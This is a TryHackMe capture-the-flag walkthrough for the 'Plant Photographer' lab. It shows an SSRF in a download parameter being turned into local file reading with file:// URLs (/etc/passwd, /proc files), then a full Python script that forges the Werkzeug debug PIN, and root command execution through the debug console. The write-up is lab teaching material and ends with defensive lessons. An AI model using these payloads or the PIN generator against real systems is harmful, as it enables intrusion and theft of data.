### [Plant Photographer] - [TryHackMe] Walkthrough

#### 1. Challenge Overview
**Name:** Plant Photographer  
**Thumbnail:** ./Walkthroughs/thumbnails/plant.png
**Platform:** TryHackMe
**Category:** Boot2Root  
**Difficulty:** Hard  
**Date:** June 12, 2026  
**Target IP:** 10.48.147.86  

**Challenge Description:**
Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos. Proud of building the site himself from scratch, he’s asked you to take a quick look and let him know if anything could be improved. Look closely at how the site works under the hood, and determine whether it was coded with best practices in mind.

---

#### 2. Initial Footprint: The "Simple" Portfolio


The journey began with a standard Nmap scan to see what we were dealing with. The target appeared to be a personal portfolio for a botanist named Jay Green.

```bash
nmap -sC -sV 10.48.147.86
```

**Key Finding:** 
Port 80 was open, running **Werkzeug httpd 0.16.0 (Python 3.10.7)**. This immediately caught my eye. Werkzeug is a powerful WSGI utility library, but when left in debug mode, it’s a goldmine for attackers.

---

## 2. Reconnaissance & "Cracks" in the Wall

Browsing the site manually, it seemed static and harmless. However, curious about the backend structure, I performed a quick directory fuzzing.

### Discovering the "Admin" and "Console"
Two interesting endpoints surfaced:
- `http://10.48.147.86/admin`: Returned a "Forbidden" error, claiming it was only accessible from localhost.
- `http://10.48.147.86/console`: The dreaded Werkzeug Debug Console. It was locked with a PIN, but its mere existence confirmed the server was running in a dangerous debug state.

---

## 3. The Flawed Logic of `/download`

While exploring the "Resume" download link, I noticed a very peculiar URL structure:
`http://10.48.147.86/download?server=secure-file-storage.com:8087&id=75482342`

As a security auditor, this screamed **SSRF (Server-Side Request Forgery)**. Why would a local website ask the server to fetch a file from an external domain provided in a URL parameter?

### Turning Verbosity into Intelligence
I tried to "break" the downloader by changing the port to something invalid (`8086`). Instead of a clean "File Not Found," the server vomited a massive **pycurl error**.

**The Leak:**
The error message was a goldmine. It revealed:
1. **The API Key:** `THM{Hello_Im_just_an_API_key}` (used to authenticate with the "secure" storage).
2. **Internal Paths:** 
   - Webroot: `/usr/src/app/app.py`
   - Python packages: `/usr/local/lib/python3.10/site-packages/flask/app.py`

---

## 4. Bypassing the Sandbox: From SSRF to LFI

Knowing the server used `pycurl` to fetch files, I attempted to use the `file://` protocol to read local system files.

Initially, the backend seemed to append a directory and extension to my input. To "jailbreak" this, I used a **URL Fragment (`#`)**, encoded as `%23`. This tricked the parser into ignoring everything the backend tried to append.

**Reading `/etc/passwd`:**
`http://10.48.147.86/download?server=file:///etc/passwd%23&id=1`
**Result:** Success. I had full read access to the filesystem.

**Retrieving the Source Code:**
`http://10.48.147.86/download?server=file:///usr/src/app/app.py%23&id=1`
This confirmed the logic for the `/admin` route and pointed to a `private-docs` folder.

**Flag 2 (The Secret Document):**
Accessing `http://10.48.147.86/download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=1` yielded the second flag: `THM{c4n_i_haz_flagz_plz?}`.

---

## 5. Hijacking the "Developer's Backdoor" (PIN Cracking)

The final goal was Remote Code Execution (RCE) via the `/console`. To unlock it, I needed the **Werkzeug Debug PIN**. The PIN is generated based on several "bits" of information unique to the server.

### Gathering the "Server DNA"
Using the LFI vulnerability, I systematically extracted the required bits:

1. **Username:** Found via `file:///proc/self/environ%23`. The `HOME` variable was `/root`, meaning the user was `root`.
2. **Module Name:** Standard for Flask: `flask.app`.
3. **App Name:** Standard for Flask: `Flask`.
4. **Flask Path:** Leaked in the earlier error: `/usr/local/lib/python3.10/site-packages/flask/app.py`.
5. **MAC Address:** 
   - Found the interface name via `file:///proc/net/arp%23` (`eth0`).
   - Read the MAC via `file:///sys/class/net/eth0/address%23`: `02:42:ac:14:00:02`.
   - Converted to decimal using a Python one-liner:
     ```bash
     python3 -c "print(int('02:42:ac:14:00:02'.replace(':',''), 16))"
     ```
     **Result:** `2485378088962`.
6. **Machine ID:** 
   - Concatenated the Boot ID (`file:///proc/sys/kernel/random/boot_id%23`) and the Cgroup ID (`file:///proc/self/cgroup%23`).

### Generating the PIN
I used the following Python script to reconstruct the PIN logic. Note that for this version of Werkzeug/Flask, the hashing algorithm was `MD5`.

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378088962',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

---

## 6. Full System Compromise

Entering the generated PIN into the `/console` unlocked the interactive Python shell. I used the following session to verify my identity, explore the environment, and capture the final flag.

**Exploit Session:**
```python
>>> __import__('os').popen('whoami').read();
'root\n'
>>> __import__('os').popen('pwd').read();
'/usr/src/app\n'
>>> __import__('os').popen('ls').read();
'Dockerfile\napp.py\nflag-982374827648721338.txt\nprivate-docs\npublic-docs\n'
>>> __import__('os').popen('cat flag-982374827648721338.txt').read();
'THM{SSRF2RCE_2_1337_4_M3}\n'
```

**Final Flag:** `THM{SSRF2RCE_2_1337_4_M3}`

---

## Lessons Learned
1. **Never leave Debug Mode on in production.** The Werkzeug console is a literal shell.
2. **Strictly validate URL parameters.** Using a `server` parameter without a whitelist is an invitation for SSRF.
3. **Information Disclosure is a catalyst.** A simple verbose error message provided the roadmap for the entire compromise.
